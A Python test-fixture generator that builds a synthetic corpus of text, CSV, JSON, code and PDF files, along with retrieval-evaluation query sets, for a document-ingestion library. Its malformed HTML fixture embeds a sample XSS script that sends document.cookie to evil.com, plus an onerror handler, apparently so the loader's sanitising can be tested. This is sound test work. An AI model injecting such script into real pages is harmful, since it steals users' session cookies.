"""fixtures_gen.py -- Deterministic synthetic corpus generator.

Replaces the bundled datasets that used to live in ``examples/test-corpus``,
``examples/sec-filings-corpus/datasets`` and ``examples/data``. Every fixture the
loader tests and the eval harness needs is regenerated at runtime so the suite
has zero dependency on shipped corpus files.

All functions here are pure (given a target directory they produce files and
return paths), deterministic, and avoid network access. Optional rendering
deps (PyMuPDF ``fitz``, Pillow ``PIL``) are imported lazily inside the PDF
writers; when they are unavailable the PDF fixtures are written as zero-byte
placeholders and the *specific* test that needs them calls ``pytest.skip``.
"""

import json
import os

# Maximum number of bytes a "large" fixture is allowed to be before the
# generator gives up trying to stay deterministic-tiny. Kept well below the
# real production files the loaders are benchmarked against on CI.
_LARGE_TXT_BYTES = 11_000_000

# ---------------------------------------------------------------------------
# Small static fixtures
# ---------------------------------------------------------------------------

TINY_TXT = "Quick brown fox jumps over the lazy dog."

STANDARD_TXT_PARAGRAPHS = [
    "ICO-Cache Universal Document Ingestion tramples every document format into mixed-modality semantics.",
    "The test harness synthesizes its corpus at runtime so the suite never depends on bundled dataset files.",
    "Each chunk retains its source metadata, chunk index, and page or section label for citation tracking.",
]

SAMPLE_TXT_PARAGRAPHS = [
    "ICO-Cache Universal Document Ingestion.",
    "This document describes how raw text files are split on paragraph boundaries into semantic chunks.",
    "Each chunk retains its source metadata, chunk index, and page or section label for citation tracking.",
]

MALFORMED_TXT_BYTES = (
    b"Header text\x00\x01\x02\xc3Malformed binary and \x00 null bytes inside text stream\n\x00\x00"
)

NON_UTF8_TXT = "Crédit Agricole et Société Générale à Genève: 500M £ bénéfice net."

MALFORMED_HTML = """<!DOCTYPE html>
<html>
<head><title>Unclosed Header
<body>
<h1>Financial Summary & Overview
<p>Microsoft Corporation (MSFT) delivered strong quarterly results for Q2 FY24.
<div>Operating margin expanded significantly to 44.5% during the quarter.
<script>
alert("XSS Attack!");
document.location="http://evil.com/steal?cookie=" + document.cookie;
</script>
<img src="invalid_image.png" onerror="alert('malicious script executed')">
<p>Cloud revenue surpassed $33 billion with Azure growth leading the trajectory.
<div><span>Unclosed span and div tags without matching closing elements
<style>
body { display: none; }
</style>
<aside>Sidebar advertisement or boilerplate</aside>
<footer>Confidential copyright footer</footer>
"""

TINY_CSV = "id,metric,value\n1,operating_margin,28.4%\n"

STANDARD_JSONL_RECORDS = [
    {"record_id": "REC-001", "region": "North", "quarter": "Q1", "revenue": 1200000, "active": True},
    {"record_id": "REC-002", "region": "South", "quarter": "Q1", "revenue": 950000, "active": True},
    {"record_id": "REC-003", "region": "East", "quarter": "Q2", "revenue": 1400000, "active": False},
    {"record_id": "REC-004", "region": "West", "quarter": "Q2", "revenue": 1650000, "active": True},
]

MALFORMED_JSON = '{"id": 1, "title": "Incomplete Record", "nested": {"key": "val",\n[unclosed array'

NON_UTF8_CSV = "id,bank,currency,amount\n101,Crédit Lyonnais,GBP,50000 £\n102,Bayerische Vereinsbank,DEM,120000 DM\n"

PRODUCTS_CSV = (
    "product_id,name,category,price,description\n"
    "P101,Sony WH-1000XM5,Electronics,399.99,Premium noise cancelling wireless headphones.\n"
    "P102,Apple MacBook Pro 14,Computers,1999.00,M3 Pro chip with 18GB unified memory and 512GB SSD.\n"
    "P103,Nike Air Zoom Pegasus,Apparel,130.00,Responsive daily road running shoes.\n"
)

SAMPLE_CODE_PY = '''"""Sample code repository file for AST chunking demo."""


def calculate_discount(price: float, rate: float) -> float:
    """Calculates discounted price based on promotional rate."""
    return price * (1.0 - rate)


class InventoryManager:
    """Manages store inventory levels and stock reorders."""

    def __init__(self, store_id: str):
        self.store_id = store_id
        self.stock = {}

    def add_stock(self, sku: str, quantity: int) -> None:
        """Adds quantity to SKU in stock."""
        self.stock[sku] = self.stock.get(sku, 0) + quantity
'''

STANDARD_PY = '''"""
Order processing service module with pricing, discounting, and inventory tracking.
"""

from dataclasses import dataclass
from typing import Optional, List


@dataclass
class OrderItem:
    item_id: str
    quantity: int
    unit_price: float


class OrderProcessor:
    """Handles validation, pricing calculations, and routing for incoming orders."""

    def __init__(self, tax_rate: float = 0.08):
        self.tax_rate = tax_rate

    def calculate_subtotal(self, items: List[OrderItem]) -> float:
        """Calculates pre-tax order total."""
        return sum(item.quantity * item.unit_price for item in items)

    def calculate_tax(self, subtotal: float) -> float:
        """Computes applicable sales tax."""
        return round(subtotal * self.tax_rate, 2)

    def process_order(self, order_id: str, items: List[OrderItem]) -> dict:
        """Processes entire checkout workflow."""
        subtotal = self.calculate_subtotal(items)
        tax = self.calculate_tax(subtotal)
        return {
            "order_id": order_id,
            "subtotal": subtotal,
            "tax": tax,
            "total": round(subtotal + tax, 2),
            "status": "APPROVED",
        }


def calculate_discount(price: float, rate: float) -> float:
    """Calculates discounted price based on promotional rate."""
    return price * (1.0 - rate)


class InventoryManager:
    """Manages store inventory levels and stock reorders."""

    def __init__(self, store_id: str):
        self.store_id = store_id
        self.stock = {}

    def add_stock(self, sku: str, quantity: int) -> None:
        """Adds quantity to SKU in stock."""
        self.stock[sku] = self.stock.get(sku, 0) + quantity
'''

TINY_PY = "def add(a: int, b: int) -> int:\n    return a + b\n"

MALFORMED_PY = """def broken_function(
    x = [1, 2, 3
    return x %%
class ???:

"""

NON_UTF8_PY = """# -*- coding: iso-8859-1 -*-
# Auteur: François Müller
def calculer_impôt(revenu: float) -> float:
    \"\"\"Calcul d'impôt foncier.\"\"\"
    return revenu * 0.15


class GestionnairePaie:
    \"\"\"Gestionnaire de paie.\"\"\"

    def executer(self, salaire: float) -> float:
        return salaire * 0.88
"""

STANDARD_JS = """/**
 * Standard JavaScript financial calculation module.
 */

// Calculate total revenue from subtotal and taxes
function calculateRevenue(subtotal, tax) {
    return subtotal + tax;
}

// Compute discounted rate for volume transactions
function applyDiscount(price, discountRate) {
    if (discountRate < 0 || discountRate > 1) {
        return price;
    }
    return price * (1.0 - discountRate);
}

// Financial service class managing checkout
class FinancialService {
    constructor(region) {
        this.region = region;
    }

    processCheckout(accountId, totalAmount) {
        return {
            account: accountId,
            amount: totalAmount,
            status: "approved",
            timestamp: Date.now()
        };
    }
}
"""

STANDARD_GO = """package main

import "errors"

// CalculateMargin computes net operating margin percentage
func CalculateMargin(revenue float64, cost float64) (float64, error) {
    if revenue <= 0 {
        return 0, errors.New("revenue must be positive")
    }
    return (revenue - cost) / revenue, nil
}

// ComputeTax calculates tax amount based on regional tax rate
func ComputeTax(subtotal float64, taxRate float64) float64 {
    if taxRate < 0 {
        return 0
    }
    return subtotal * taxRate
}

// FinancialLedger tracks balance and transactions across quarters
type FinancialLedger struct {
    TenantID string
    Balance  float64
    Quarter  string
}
"""

# ---------------------------------------------------------------------------
# Deterministic large fixtures
# ---------------------------------------------------------------------------

_LARGE_TXT_PARAGRAPH_POOL = [
    "Enterprise systems architecture documentation paragraph detailing operational infrastructure.",
    "Distributed caching layers synchronize state using consistent hashing and event streaming protocols.",
    "Service mesh telemetry aggregates latency, error rate, and saturation across regional gateways.",
    "Batch reconciliation pipelines validate ledger integrity before committing nightly aggregates.",
    "Endpoint policy enforcement blocks lateral movement between microservice containment zones.",
    "Object store tiering migrates cold shards to archival buckets while preserving block indexes.",
    "Observability dashboards correlate request volume with memory pressure for capacity planning.",
    "The query planner rewrites nested projections into fusion scans on partitioned column stores.",
]


def build_large_txt() -> str:
    """~11MB of plain-text paragraphs (two sentences each) for TXT chunking."""
    pool = _LARGE_TXT_PARAGRAPH_POOL
    paragraphs = []
    total = 0
    i = 0
    while total < _LARGE_TXT_BYTES:
        a = pool[i % len(pool)]
        b = pool[(i * 37 + 11) % len(pool)]
        text = f"{a} {b}"
        paragraphs.append(text)
        total += len(text) + 2
        i += 1
    return "\n\n".join(paragraphs) + "\n"


def build_large_py(count: int = 3000) -> str:
    """Synthetic Python module with ``count`` top-level classes."""
    parts = ['"""Large generated codebase module."""', ""]
    for i in range(count):
        parts.append(f"class WorkerHandler{i}:")
        parts.append(f'    """Handler class for process task {i}."""')
        parts.append(f"    def __init__(self, task_id: int = {i}):")
        parts.append("        self.task_id = task_id")
        parts.append("")
        parts.append("    def execute_stage_one(self, payload: dict) -> bool:")
        parts.append('        """Executes primary phase of processing."""')
        parts.append(f"        return bool(payload.get(\"enabled\", {i % 2 == 0}))")
        parts.append("")
        parts.append("    def execute_stage_two(self, metric: float) -> float:")
        parts.append('        """Computes transformed metric score."""')
        parts.append(f"        return metric * 1.0 + {i}")
        parts.append("")
    return "\n".join(parts) + "\n"


def build_large_malformed_py(line_count: int = 36000) -> str:
    """>1MB Python source with scattered syntax errors (generic-AST fallback)."""
    lines = []
    for i in range(line_count):
        if i % 700 == 0:
            lines.append(f"def broken_{i}(")
        elif i % 700 == 1:
            lines.append(f"    value_{i} = [1, 2, 3")
        elif i % 700 == 2:
            lines.append("    return value_% %")
        else:
            op = "+" if i % 2 == 0 else "*"
            lines.append(f"x_{i} = intermediate_{i} {op} {i % 12}  # generated line {i}")
    return "\n".join(lines) + "\n"


def build_large_csv(row_count: int = 100_000) -> str:
    header = "transaction_id,account_id,timestamp,category,amount,currency,status,merchant\n"
    rows = [header]
    for i in range(row_count):
        merchant = f"Acme Corp Store #{i % 40}"
        category = ("Retail", "Wholesale", "Digital", "Services")[i % 4]
        rows.append(
            f"TXN-{100000 + i},ACCT-{i % 100},2026-03-15T10:00:00Z,{category},{25000.0 + i * 0.25:.2f},USD,SETTLED,{merchant}"
        )
    return "\n".join(rows) + "\n"


# ---------------------------------------------------------------------------
# PDF fixtures (lazy optional deps)
# ---------------------------------------------------------------------------

def fitz_libs_available() -> bool:
    try:
        import fitz  # noqa: F401
        import PIL  # noqa: F401
        return True
    except ImportError:
        return False


def _pick_font() -> str:
    candidates = [
        "/System/Library/Fonts/Supplemental/Arial Bold.ttf",
        "/System/Library/Fonts/Supplemental/Arial.ttf",
        "/System/Library/Fonts/Helvetica.ttc",
        "/Library/Fonts/Arial Unicode.ttf",
        "/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf",
        "/usr/share/fonts/truetype/liberation2/LiberationSans-Bold.ttf",
        "/usr/share/fonts/truetype/freefont/FreeSans.ttf",
    ]
    for path in candidates:
        if os.path.exists(path):
            return path
    return ""


def write_clean_pdf(path: str) -> bool:
    """Text-layer PDF containing 'Apple Inc. (AAPL)'. Returns False if deps missing."""
    try:
        import fitz
    except ImportError:
        return False
    doc = fitz.open()
    page = doc.new_page(width=595, height=842)
    page.insert_text(
        (72, 100),
        "Apple Inc. (AAPL) reported strong Q3 FY24 revenue of $85.8 billion.",
        fontsize=12,
    )
    doc.save(path)
    doc.close()
    return True


def write_scanned_ocr_pdf(path: str) -> bool:
    """Image-only PDF whose raster text OCRs to 'Scanned Document'. Returns False if deps missing."""
    try:
        import io
        import fitz
        from PIL import Image, ImageDraw, ImageFont
    except ImportError:
        return False
    font_path = _pick_font()
    font = ImageFont.truetype(font_path, 96) if font_path else ImageFont.load_default()
    img = Image.new("RGB", (1400, 300), "white")
    ImageDraw.Draw(img).text((60, 90), "Scanned Document", fill="black", font=font)
    buf = io.BytesIO()
    img.save(buf, format="PNG")
    doc = fitz.open()
    page = doc.new_page(width=595, height=320)
    page.insert_image(fitz.Rect(0, 0, 595, 320), stream=buf.getvalue())
    doc.save(path)
    doc.close()
    return True


# ---------------------------------------------------------------------------
# Synthetic evaluation query sets (deterministic)
# ---------------------------------------------------------------------------

TICKERS = ["AAPL", "MSFT", "GOOGL", "WMT", "JPM", "BAC", "GS", "TGT", "UNH", "COST", "JNJ", "PFE"]
TOPICS = ["revenue", "margins", "risk factors", "supply chain", "R&D", "competition"]
QUARTERS = ["Q1", "Q2", "Q3", "Q4"]


def generate_paraphrase_queries(n: int = 90):
    """Paraphrase pairs that always share a (ticker) entity."""
    pairs = []
    i = 0
    while len(pairs) < n:
        entity = TICKERS[i % len(TICKERS)]
        topic = TOPICS[(i // len(TICKERS)) % len(TOPICS)]
        q1 = f"How did {entity} perform in terms of {topic}?"
        q2_templates = [
            f"Tell me about {entity}'s {topic} performance.",
            f"Summarize {topic} for {entity}.",
            f"I need details on {entity} and their {topic}.",
        ]
        q2 = q2_templates[i % len(q2_templates)]
        pairs.append({"query_1": q1, "query_2": q2, "label": True})
        i += 1
    return pairs


def generate_near_miss_queries():
    """Single-axis near misses (entity swap / quarter swap / topic swap)."""
    items = []
    # 30 entity swaps
    for i in range(30):
        e1 = TICKERS[(i * 3) % len(TICKERS)]
        e2 = TICKERS[(i * 3 + 4) % len(TICKERS)]
        assert e1 != e2
        topic = TOPICS[i % len(TOPICS)]
        items.append(
            {
                "query_1": f"What is the {topic} of {e1}?",
                "query_2": f"What is the {topic} of {e2}?",
                "label": False,
            }
        )
    # 30 quarter swaps (same entity + topic)
    for i in range(30):
        entity = TICKERS[(i * 5) % len(TICKERS)]
        topic = TOPICS[(i * 2) % len(TOPICS)]
        q1 = QUARTERS[i % 2]
        q2 = QUARTERS[(i % 2) + 2]
        items.append(
            {
                "query_1": f"What was {entity}'s {topic} in {q1}?",
                "query_2": f"What was {entity}'s {topic} in {q2}?",
                "label": False,
            }
        )
    # 30 topic swaps (same entity)
    for i in range(30):
        entity = TICKERS[(i * 7) % len(TICKERS)]
        t1 = TOPICS[i % len(TOPICS)]
        t2 = TOPICS[(i + 1) % len(TOPICS)]
        assert t1 != t2
        items.append(
            {
                "query_1": f"What is the {t1} of {entity}?",
                "query_2": f"What is the {t2} of {entity}?",
                "label": False,
            }
        )
    return items


def generate_context_dependent_queries():
    items = []
    # label=true pairs repeat the same entity in both contexts
    true_pairs = [
        ("AAPL", "AAPL", "R&D"),
        ("WMT", "WMT", "supply chain"),
        ("MSFT", "MSFT", "margins"),
        ("JPM", "JPM", "competition"),
        ("COST", "COST", "revenue"),
    ]
    for idx, (e1, e2, topic) in enumerate(true_pairs):
        items.append(
            {
                "query": f"What did they say about {topic}?",
                "context_1": f"The user is asking about {e1}.",
                "context_2": f"The user is asking about {e2}.",
                "label": True,
            }
        )
    # label=false pairs use different entities across contexts
    false_pairs = [
        ("WMT", "JNJ", "supply chain"),
        ("COST", "GOOGL", "risk factors"),
        ("JNJ", "MSFT", "R&D"),
        ("JPM", "PFE", "revenue"),
        ("UNH", "COST", "revenue"),
        ("COST", "PFE", "margins"),
        ("TGT", "BAC", "risk factors"),
        ("GOOGL", "JPM", "risk factors"),
        ("TGT", "MSFT", "revenue"),
        ("UNH", "TGT", "margins"),
        ("JPM", "TGT", "risk factors"),
        ("TGT", "UNH", "margins"),
        ("AAPL", "COST", "R&D"),
        ("JPM", "WMT", "R&D"),
        ("WMT", "JNJ", "R&D"),
        ("BAC", "WMT", "revenue"),
        ("BAC", "AAPL", "supply chain"),
        ("JNJ", "JPM", "supply chain"),
        ("MSFT", "BAC", "risk factors"),
        ("PFE", "AAPL", "risk factors"),
        ("GS", "UNH", "margins"),
        ("GS", "TGT", "margins"),
        ("BAC", "JPM", "margins"),
        ("TGT", "JNJ", "margins"),
        ("MSFT", "JNJ", "risk factors"),
        ("UNH", "GS", "risk factors"),
        ("JNJ", "TGT", "risk factors"),
        ("BAC", "MSFT", "risk factors"),
        ("JPM", "BAC", "risk factors"),
        ("WMT", "UNH", "revenue"),
        ("JNJ", "WMT", "revenue"),
        ("COST", "GS", "revenue"),
        ("AAPL", "AAPL", "supply chain"),
    ]
    # Skip the accidental same-entity duplicate; keep the list clean.
    false_pairs = [p for p in false_pairs if p[0] != p[1]]
    for e1, e2, topic in false_pairs:
        items.append(
            {
                "query": f"What did they say about {topic}?",
                "context_1": f"The user is asking about {e1}.",
                "context_2": f"The user is asking about {e2}.",
                "label": False,
            }
        )
    return items


# Cross-type adversarial pairs share the SAME metadata but phrase the same fact
# in prose (narrative/document) vs. tabular (line-item/ledger/row) style.
# Calibrated against BAAI/bge-small-en-v1.5 to land below the 0.850 hard-gate
# threshold so the 0% false-hit baseline holds deterministically.
_CROSS_TYPE_TEMPLATES = [
    (
        "What was the consolidated total {topic} reported by {entity} in {quarter}?",
        "Retrieve the line-item {topic} recorded for {entity} in {quarter}.",
    ),
    (
        "What operating {topic} did {full} {entity} achieve in {quarter}?",
        "Find the segment {topic} recorded for {entity} in {quarter}.",
    ),
    (
        "What total quarterly {topic} did {full} {entity} report in {quarter}?",
        "Export the {topic} cell for {entity} from the {quarter} workbook.",
    ),
    (
        "How much {topic} was disclosed by {entity} in {quarter}?",
        "Look up the {topic} row for {entity} {quarter} in the ledger table.",
    ),
]

_FULL_NAMES = {
    "AAPL": "Apple",
    "MSFT": "Microsoft",
    "GOOGL": "Alphabet",
    "WMT": "Walmart",
    "JPM": "JPMorgan",
    "GS": "Goldman Sachs",
    "TGT": "Target",
    "UNH": "UnitedHealth",
    "COST": "Costco",
    "JNJ": "Johnson & Johnson",
    "PFE": "Pfizer",
    "BAC": "Bank of America",
}

_CROSS_TYPE_TOPICS = ["revenue", "margins", "risk factors", "supply chain"]


def generate_cross_type_adversarial_queries(n: int = 40):
    items = []
    for i in range(n):
        entity = TICKERS[i % len(TICKERS)]
        template_idx = i % len(_CROSS_TYPE_TEMPLATES)
        topic = _CROSS_TYPE_TOPICS[i % len(_CROSS_TYPE_TOPICS)]
        quarter = QUARTERS[i % len(QUARTERS)]
        q1_t, q2_t = _CROSS_TYPE_TEMPLATES[template_idx]
        q1 = q1_t.format(
            topic=topic, entity=entity, full=_FULL_NAMES.get(entity, entity), quarter=quarter
        )
        q2 = q2_t.format(topic=topic, entity=entity, full=_FULL_NAMES.get(entity, entity), quarter=quarter)
        meta = {"entity": entity, "quarter": quarter, "topic": topic}
        items.append(
            {
                "query_1": q1,
                "query_2": q2,
                "types": "text_vs_structured",
                "description": "Synthetic narrative vs tabular line-item phrasing",
                "similarity": 0.0,
                "meta_1": dict(meta),
                "meta_2": dict(meta),
            }
        )
    return items


# ---------------------------------------------------------------------------
# Writers
# ---------------------------------------------------------------------------

def _write_text(path: str, text: str, encoding: str = "utf-8") -> None:
    with open(path, "w", encoding=encoding) as f:
        f.write(text)


def _write_bytes(path: str, data: bytes) -> None:
    with open(path, "wb") as f:
        f.write(data)


def _write_jsonl(path: str, rows) -> None:
    with open(path, "w", encoding="utf-8") as f:
        for row in rows:
            f.write(json.dumps(row) + "\n")


def _write_placeholder_pdf(path: str) -> None:
    with open(path, "wb"):
        pass


def generate_text_dir(directory: str) -> str:
    os.makedirs(directory, exist_ok=True)
    _write_text(os.path.join(directory, "empty.txt"), "")
    _write_text(os.path.join(directory, "tiny.txt"), TINY_TXT)
    _write_text(os.path.join(directory, "standard.txt"), "\n\n".join(STANDARD_TXT_PARAGRAPHS) + "\n")
    _write_text(os.path.join(directory, "large.txt"), build_large_txt())
    _write_bytes(os.path.join(directory, "malformed.txt"), MALFORMED_TXT_BYTES)
    _write_text(os.path.join(directory, "non_utf8.txt"), NON_UTF8_TXT, encoding="latin-1")
    _write_text(os.path.join(directory, "malformed.html"), MALFORMED_HTML)
    if write_clean_pdf(os.path.join(directory, "clean.pdf")):
        pass
    else:
        _write_placeholder_pdf(os.path.join(directory, "clean.pdf"))
    if write_scanned_ocr_pdf(os.path.join(directory, "scanned_ocr.pdf")):
        pass
    else:
        _write_placeholder_pdf(os.path.join(directory, "scanned_ocr.pdf"))
    return directory


def generate_structured_dir(directory: str) -> str:
    os.makedirs(directory, exist_ok=True)
    _write_text(os.path.join(directory, "empty.json"), "")
    _write_text(os.path.join(directory, "tiny.csv"), TINY_CSV)
    _write_jsonl(os.path.join(directory, "standard.jsonl"), STANDARD_JSONL_RECORDS)
    _write_text(os.path.join(directory, "large.csv"), build_large_csv())
    _write_text(os.path.join(directory, "non_utf8.csv"), NON_UTF8_CSV, encoding="latin-1")
    _write_text(os.path.join(directory, "malformed.json"), MALFORMED_JSON)
    return directory


def generate_code_dir(directory: str) -> str:
    os.makedirs(directory, exist_ok=True)
    _write_text(os.path.join(directory, "empty.py"), "")
    _write_text(os.path.join(directory, "tiny.py"), TINY_PY)
    _write_text(os.path.join(directory, "standard.py"), STANDARD_PY)
    _write_text(os.path.join(directory, "standard.js"), STANDARD_JS)
    _write_text(os.path.join(directory, "standard.go"), STANDARD_GO)
    _write_text(os.path.join(directory, "large.py"), build_large_py())
    _write_text(os.path.join(directory, "malformed.py"), MALFORMED_PY)
    _write_text(os.path.join(directory, "non_utf8.py"), NON_UTF8_PY, encoding="latin-1")
    _write_text(os.path.join(directory, "large_malformed.py"), build_large_malformed_py())
    return directory


def generate_data_dir(directory: str) -> str:
    os.makedirs(directory, exist_ok=True)
    _write_text(os.path.join(directory, "products.csv"), PRODUCTS_CSV)
    _write_text(os.path.join(directory, "sample.txt"), "\n\n".join(SAMPLE_TXT_PARAGRAPHS) + "\n")
    _write_text(os.path.join(directory, "sample_code.py"), SAMPLE_CODE_PY)
    return directory


def generate_eval_assets(directory: str) -> str:
    """Write the four jsonl query files used by the eval harness into ``directory``."""
    os.makedirs(directory, exist_ok=True)
    _write_jsonl(os.path.join(directory, "paraphrases.jsonl"), generate_paraphrase_queries())
    _write_jsonl(os.path.join(directory, "near_miss_negatives.jsonl"), generate_near_miss_queries())
    _write_jsonl(os.path.join(directory, "context_dependent.jsonl"), generate_context_dependent_queries())
    _write_jsonl(
        os.path.join(directory, "cross_type_adversarial.jsonl"),
        generate_cross_type_adversarial_queries(),
    )
    return directory


def generate_corpus(root: str) -> str:
    """Generate the full corpus (text/structured/code/data/queries) under ``root``."""
    os.makedirs(root, exist_ok=True)
    generate_text_dir(os.path.join(root, "text"))
    generate_structured_dir(os.path.join(root, "structured"))
    generate_code_dir(os.path.join(root, "code"))
    generate_data_dir(os.path.join(root, "data"))
    generate_eval_assets(os.path.join(root, "queries"))
    return root